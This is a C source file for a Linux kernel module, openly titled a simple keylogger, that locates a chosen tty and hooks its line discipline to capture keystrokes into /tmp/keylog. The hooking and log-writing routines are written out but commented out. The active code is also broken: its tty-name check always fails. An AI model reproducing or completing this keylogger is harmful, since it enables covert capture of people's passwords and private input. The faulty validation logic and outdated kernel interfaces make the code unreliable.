/*
 *  keylog.c
 *
 *  Copyright (C) Hector Pottier
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version
 *
 *  This program is distributed in the hope that it will be useful, but 
 *  WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU 
 *  General Public License for more details.
 *
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/file.h>
#include <linux/mutex.h>
#include <linux/list.h>
#include <linux/string.h>
#include <linux/kstrtox.h>
#include <linux/ctype.h>
#include <linux/tty.h>
#include <linux/tty_driver.h>
#include <linux/tty_ldisc.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Hector Pottier");
MODULE_DESCRIPTION("A simple keylogger.");

/* #define KEYLOG_LOGFILE "/tmp/keylog" */
/* #define KEYLOG_BUFFER_SIZE 256 */

extern struct list_head tty_drivers;
extern struct mutex tty_mutex;

char *keylog_tty_name = "tty7";
module_param(keylog_tty_name, charp, 0);
MODULE_PARM_DESC(keylog_tty_name, "Name of the tty to log (default: tty7).");

/* char keylog_buf[KEYLOG_BUFFER_SIZE]; */

/* size_t keylog_index = 0; */

struct tty_struct *keylog_tty = NULL;

/* int (*old_receive_buf)(struct tty_struct *, const unsigned char *, */
/* 						const char *, int); */

/* void keylog_write(void) */
/* { */
/* 	struct file *file; */
/* 	mm_segment_t old_fs; */

/* 	old_fs = get_fs(); */
/* 	set_fs(KERNEL_DS); */

/* 	file = filp_open(KEYLOG_LOGFILE, O_CREAT | O_APPEND | O_WRONLY, 0); */
/* 	file->f_op->write(file, keylog_buf, keylog_index + 1, &file->f_pos); */
/* 	filp_close(file, NULL); */
/* 	keylog_index = 0; */

/* 	set_fs(old_fs); */
/* } */

/* void keylog_logging(const unsigned char *cp, int count) */
/* { */
/* 	if (count + keylog_index >= KEYLOG_BUFFER_SIZE) */
/* 		keylog_write(); */
/* 	for (int x = 0; x < count; ++x) */
/* 	{ */
/* 		keylog_buf[keylog_index] = cp[x]; */
/* 		++keylog_index; */
/* 	} */
/* } */

/* int keylog_receive_buf(struct tty_struct *tty, const unsigned char *cp, */
/* 							  const char *fp, int count) */
/* { */
/* 	/\* keylog_logging(cp, count); *\/ */
/* 	return ((*old_receive_buf)(tty, cp, fp, count)); */
/* } */

struct tty_struct *keylog_tty_from_driver(struct tty_driver *driver, char *name)
{
	size_t len;

	len = strlen(name);
	for (unsigned int x = 0; x < driver->num; ++x)
	{
		if (strlen(driver->ttys[x]->name) == len &&
			strncmp(driver->ttys[x]->name, name, len) == 0)
			return (driver->ttys[x]);
	}
	return (NULL);
}

struct tty_driver *keylog_get_tty_driver(char *name)
{
	int index;
	struct tty_driver *driver;

	if (kstrtoint(&name[3], 10, &index))
		return (NULL);
	list_for_each_entry(driver, &tty_drivers, tty_drivers)
		if (strlen(driver->name) == 3 && strncmp(name, driver->name, 3) == 0)
		{
			if (index < driver->num)
			return (driver);
		}
	return (NULL);
}

int keylog_check_tty_name(char *name)
{
	if (strncmp(name, "tty", 3) != 0 || strncmp(name, "pts", 3) != 0)
		return (1);
	for (size_t x = 3; name[x]; ++x)
		if (isdigit(name[x]) == 0)
			return (1);
	return (0);
}

int __init keylog_init(void)
{
	struct tty_driver *driver;

	if (keylog_check_tty_name(keylog_tty_name))
	{
		printk(KERN_ALERT "keylog: Wrong argument: %s\n", keylog_tty_name);
		return (-1);
	}

	mutex_lock(&tty_mutex);
	driver = keylog_get_tty_driver(keylog_tty_name);
	if (driver == NULL)
	{
		mutex_unlock(&tty_mutex);
		printk(KERN_ALERT "keylog: No driver found for tty %s\n",
			   keylog_tty_name);
		return (-1);
	}
	keylog_tty = keylog_tty_from_driver(driver, keylog_tty_name);
	mutex_unlock(&tty_mutex);

	/* keylog_tty = get_current_tty(); */
	if (keylog_tty == NULL)
	{
		printk(KERN_ALERT "keylog: No tty associated with module.\n");
		return (-1);
	}
	printk(KERN_ALERT "keylog: Logging keyboard on %s.\n", keylog_tty->name);
	/* old_receive_buf = keylog_tty->ldisc->ops->receive_buf2; */
	/* keylog_tty->ldisc->ops->receive_buf2 = &keylog_receive_buf; */

	return (0);
}

void __exit keylog_exit(void)
{
	/* keylog_tty->ldisc->ops->receive_buf2 = old_receive_buf; */
	printk(KERN_ALERT "keylog: Au revoir !\n");
}

module_init(keylog_init);

module_exit(keylog_exit);
